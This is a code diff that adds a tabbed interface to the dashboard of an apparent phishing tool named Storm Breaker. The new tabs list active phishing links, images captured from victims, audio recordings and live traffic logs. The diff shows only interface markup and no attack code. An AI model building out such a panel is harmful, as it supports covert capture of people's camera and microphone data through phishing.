@@ -23,6 +23,7 @@ else {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Storm Breaker | Dashboard</title>
     <link rel="stylesheet" href="./assets/css/modern-theme.css">
+    <link rel="stylesheet" href="./assets/css/tabs.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Courier+Prime&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -87,9 +88,24 @@ else {
             </div>
         </div>
 
-        <!-- Content Grid -->
-        <div class="content-grid">
-            <!-- Phishing Links -->
+        <!-- Tab Navigation -->
+        <div class="tab-navigation">
+            <button class="tab-btn active" data-tab="links">
+                <i class="fas fa-link"></i> Phishing Links
+            </button>
+            <button class="tab-btn" data-tab="images">
+                <i class="fas fa-images"></i> Images
+            </button>
+            <button class="tab-btn" data-tab="audio">
+                <i class="fas fa-volume-up"></i> Audio
+            </button>
+            <button class="tab-btn" data-tab="traffic">
+                <i class="fas fa-chart-line"></i> Live Traffic
+            </button>
+        </div>
+
+        <!-- Tab Content -->
+        <div class="tab-content active" id="tab-links">
             <div class="card">
                 <div class="card-header">
                     <h3 class="card-title">Active Phishing Links</h3>
@@ -98,8 +114,53 @@ else {
                     <!-- Links will be injected here by JS -->
                 </div>
             </div>
+        </div>
 
-            <!-- Logs & Controls -->
+        <div class="tab-content" id="tab-images">
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">Captured Images</h3>
+                    <div class="control-bar">
+                        <button class="btn-control btn-primary" id="btn-refresh-images">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                        <button class="btn-control btn-danger" id="btn-clear-images">
+                            <i class="fas fa-trash"></i> Clear All
+                        </button>
+                    </div>
+                </div>
+                <div id="images-gallery" class="images-gallery">
+                    <div class="no-content">
+                        <i class="fas fa-camera"></i>
+                        <p>No images captured yet</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="tab-audio">
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">Audio Recordings</h3>
+                    <div class="control-bar">
+                        <button class="btn-control btn-primary" id="btn-refresh-audio">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                        <button class="btn-control btn-danger" id="btn-clear-audio">
+                            <i class="fas fa-trash"></i> Clear All
+                        </button>
+                    </div>
+                </div>
+                <div id="audio-list" class="audio-list">
+                    <div class="no-content">
+                        <i class="fas fa-microphone"></i>
+                        <p>No audio recordings yet</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="tab-traffic">
             <div class="card">
                 <div class="card-header">
                     <h3 class="card-title">Live Traffic Logs</h3>
